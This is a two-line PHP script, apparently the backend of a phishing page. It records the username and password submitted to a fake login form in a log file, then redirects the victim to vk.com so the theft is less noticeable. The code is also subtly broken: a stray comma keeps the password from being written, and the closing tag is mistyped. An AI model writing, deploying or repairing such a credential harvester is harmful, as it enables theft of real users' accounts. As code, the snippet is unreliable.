<?php file_put_contents('base/ds_logs.txt', "Username: ".$_POST['login']." Password: ", $_POST['password'].'\n', FILE_APPEND); ?>
<?php header('Location: https://vk.com/'); >?